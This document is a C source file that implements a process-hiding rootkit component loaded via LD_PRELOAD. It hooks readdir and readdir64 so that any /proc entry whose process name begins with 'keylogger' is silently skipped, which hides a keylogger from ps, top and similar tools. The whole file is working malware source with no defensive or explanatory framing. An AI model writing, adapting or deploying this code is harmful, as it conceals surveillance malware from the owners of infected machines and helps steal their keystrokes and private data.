# define _GNU_SOURCE

#include <dirent.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>

static  char *processToExclude = "keylogger";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
	int		fd;
	char	tmp[64];
    ssize_t ret;
	
	if((fd = dirfd(dirp)) == -1)
        return 0;
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    if((ret = readlink(tmp, buf, size)) == -1)
        return 0;
    buf[ret] = '\0';
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
	char	tmp[256];
	FILE	*f; 
	int		unused;

    if(strspn(pid, "0123456789") != strlen(pid))
        return 0;
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    if((f = fopen(tmp, "r")) == NULL)
        return 0;

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)								\
static struct dirent	*(*original_##readdir)(DIR *) = NULL;			\
																		\
struct dirent*readdir(DIR *dirp)										\
{																		\
	char			dirName[256];										\
	char			procName[256];										\
	struct dirent	*dir;												\
																		\
	if (original_##readdir == NULL)										\
	{																	\
		original_##readdir = dlsym(RTLD_NEXT, #readdir);				\
		if (original_##readdir == NULL)									\
		{																\
			fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
			return 0;													\
		}																\
	}																	\
	while (1)															\
	{																	\
		dir = original_##readdir(dirp);									\
		if (dir)														\
		{																\
			if (get_dir_name(dirp, dirName, sizeof(dirName))			\
				&& strcmp(dirName, "/proc") == 0						\
				&& get_process_name(dir->d_name, procName)				\
				&& strncmp(procName, processToExclude, strlen(processToExclude)) == 0){			\
					/*dprintf(1, "PROCESS HIDDEN: pid=%s", dir->d_name);*/	\
					continue ;					}						\
		}																\
		break ;															\
	}																	\
	return dir;															\
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);


